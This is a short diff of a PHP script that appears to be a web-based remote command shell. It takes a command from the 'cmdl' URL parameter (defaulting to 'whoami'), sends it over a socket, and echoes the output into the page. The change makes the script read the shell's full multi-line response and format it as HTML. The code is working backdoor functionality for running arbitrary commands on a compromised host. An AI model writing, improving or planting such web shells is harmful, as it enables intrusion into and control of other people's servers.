@@ -13,7 +13,12 @@ if(!$con) {
 if($con){
     $cmdl = isset($_GET['cmdl']) ? $_GET['cmdl'] : "whoami";
     socket_write($socket, $cmdl . "\r\n\r\n");
-    $hear = socket_read($socket, 1024);
+    $hear = "";
+    while($buf = socket_read($socket, 2048)){
+        $hear .= $buf;
+        if (substr($buf, -strlen(PHP_EOL)) === PHP_EOL) break;
+    }
+    $hear = str_replace(PHP_EOL, '<br/>', $hear);
     echo $hear;
 }
 
